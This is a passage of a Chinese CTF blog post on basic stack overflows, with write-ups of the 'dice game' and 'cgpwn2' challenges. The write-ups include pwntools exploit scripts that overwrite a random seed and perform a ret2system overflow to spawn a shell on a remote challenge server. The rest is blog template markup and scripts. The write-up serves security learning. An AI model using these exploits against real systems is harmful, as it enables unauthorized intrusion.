+<p>所以我们要做的就是，将seed覆盖掉，并且去预测生成的随机数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import * </span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">'./dice_game'</span>)</span><br><span class="line">	</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,58630)</span><br><span class="line">p.recvuntil(<span class="string">" let me know your name: "</span>)</span><br><span class="line">p.send(<span class="string">"A"</span> * 0x40 + p64(1))</span><br><span class="line"></span><br><span class="line">libc.srand(1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(50): </span><br><span class="line">  p.recvuntil(<span class="string">"Give me the point(1~6): "</span>)</span><br><span class="line">  p.send(str(libc.rand()%6 + 1) + <span class="string">"\n"</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<pre><code>for i in range(50):
+a.append(libc.rand()%6+1)
+print(a)
+for i in a:
+p.recv()
+print(p.recv())
+p.sendline(str(i))
+p.interactive()</code></pre><h2 id="0x08-cgpwn2"><a href="#0x08-cgpwn2" class="headerlink" title="0x08 cgpwn2"></a>0x08 cgpwn2</h2><p>拿到题目检查防护：<br><img src="/images/zhanyichu8-1.png" alt></p>
+<p>简单运行下：<br><img src="/images/zhanyichu8-2.png" alt></p>
+<p>放到ida里看下：<br><img src="/images/zhanyichu8-3.png" alt></p>
+<p><img src="/images/zhanyichu8-4.png" alt></p>
+<p>函数上面一大串代码都没啥用。<br>主要是这里：<br><img src="/images/zhanyichu8-5.png" alt></p>
+<p>这个name是全局变量。<br><img src="/images/zhanyichu8-6.png" alt></p>
+<p>程序本身调用了system函数，但是没有现成的/bin/sh字符串，可以使用fgets将/bin/sh字符串读入bss区，然后将返回地址覆盖为system函数，参数布置为name的首地址。<br><img src="/images/zhanyichu8-7.png" alt></p>
+<p><img src="/images/zhanyichu8-8.png" alt></p>
+<p><img src="/images/zhanyichu8-9.png" alt></p>
+<p>bss段具有读写权限，我们可以将”/bin/sh”传到bss段，然后，调用system()函数，从bss段传入字符串<br>我们通过传入name的值位”/bin/sh”,达到将值写入bss段的目的<br><img src="/images/zhanyichu8-10.png" alt></p>
+<p>s的栈空间是0x38,32位的内存是4位，所以，s加上ebp的空间大小是0x42<br>42个 字符  就可以 返回我们gets 的返回地址  然后  我们 只需要 讲system 搞进去 然后输入  bin/sh 就可以了  但是别忘了 输入 system 的返回地址 （这个随便输入就行）</p>
+<p>需要输入三个函数的返回地址，第一个是fgets，返回地址是bss_addr,目的是往bss段写入bin/sh,x00是为了补齐八位<br>第二个返回地址是gets,返回地址是system_addr，目的是调用system函数<br>第三个返回地址是system,返回地址随意</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">'./cgpwn2'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"44496"</span>)</span><br><span class="line">system_addr = 0x8048420</span><br><span class="line">bss_addr = 0x804A080</span><br><span class="line">p.recvuntil(<span class="string">'name\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'here:\n'</span>)</span><br><span class="line">payload = 42*<span class="string">'a'</span> + p32(system_addr) + p32(0) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Keven
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://keven.ss06.com/2019/10/08/基本的栈溢出/" title="基本的栈溢出">http://keven.ss06.com/2019/10/08/基本的栈溢出/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:20px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-PWN/" rel="tag"># CTF PWN</a>
+          
+            <a href="/tags/二进制漏洞/" rel="tag"># 二进制漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/08/RSA加密算法/" rel="next" title="RSA加密算法">
+                <i class="fa fa-chevron-left"></i> RSA加密算法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80Njk2Mi8yMzQ2Mw=="></div>
+    </div>
+
+  
+
+
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/temp.jpg" alt="Keven">
+            
+              <p class="site-author-name" itemprop="name">Keven</p>
+              <p class="site-description motion-element" itemprop="description">等级：LV8</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/KevenS10" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="1807456258@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://baidu.com/" title="百度" target="_blank">百度</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://google.com/" title="谷歌" target="_blank">谷歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/" title="GitHub" target="_blank">GitHub</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.csdn.net/" title="CSDN" target="_blank">CSDN</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/" title="博客园" target="_blank">博客园</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="52破解" target="_blank">52破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adworld.xctf.org.cn/" title="攻防世界" target="_blank">攻防世界</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf.bugku.com/" title="bugku" target="_blank">bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wiki.x10sec.org/" title="CTF Wiki" target="_blank">CTF Wiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhihu.com/" title="知乎" target="_blank">知乎</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jianshu.com/" title="简书" target="_blank">简书</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bilibili.com/" title="bilibili" target="_blank">bilibili</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序的内存结构"><span class="nav-number">1.</span> <span class="nav-text">程序的内存结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈防护技术"><span class="nav-number">2.</span> <span class="nav-text">栈防护技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RELRO"><span class="nav-number">2.0.1.</span> <span class="nav-text">RELRO</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Stack"><span class="nav-number">2.0.2.</span> <span class="nav-text">Stack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NX"><span class="nav-number">2.0.3.</span> <span class="nav-text">NX</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PIE"><span class="nav-number">2.0.4.</span> <span class="nav-text">PIE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DEP"><span class="nav-number">2.0.5.</span> <span class="nav-text">DEP</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-where-did-you-born"><span class="nav-number">3.</span> <span class="nav-text">0x01 where did you born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-hello-pwn"><span class="nav-number">4.</span> <span class="nav-text">0x02 hello_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-level0"><span class="nav-number">5.</span> <span class="nav-text">0x03 level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-level4"><span class="nav-number">6.</span> <span class="nav-text">0x04 level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-warmup-csaw"><span class="nav-number">7.</span> <span class="nav-text">0x05 warmup-csaw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-guss-num"><span class="nav-number">8.</span> <span class="nav-text">0x06 guss num</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#关于ctype库与dll"><span class="nav-number">8.0.1.</span> <span class="nav-text">关于ctype库与dll</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#libc共享库"><span class="nav-number">8.0.2.</span> <span class="nav-text">libc共享库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-dice-game"><span class="nav-number">9.</span> <span class="nav-text">0x07 dice game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-cgpwn2"><span class="nav-number">10.</span> <span class="nav-text">0x08 cgpwn2</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Keven</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+  <div class="footer-custom">Hosted by <a target="_blank" href="https://pages.github.com">GitHub Pages</a></div>
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">全站共 10.7k 字</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+/*<div class="bg_content">
+<canvas id="canvas"></canvas>
+</div>
+<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>*/
+<!-- 代码块复制功能 -->
+<script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+<script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+
+</body>
+</html>
+
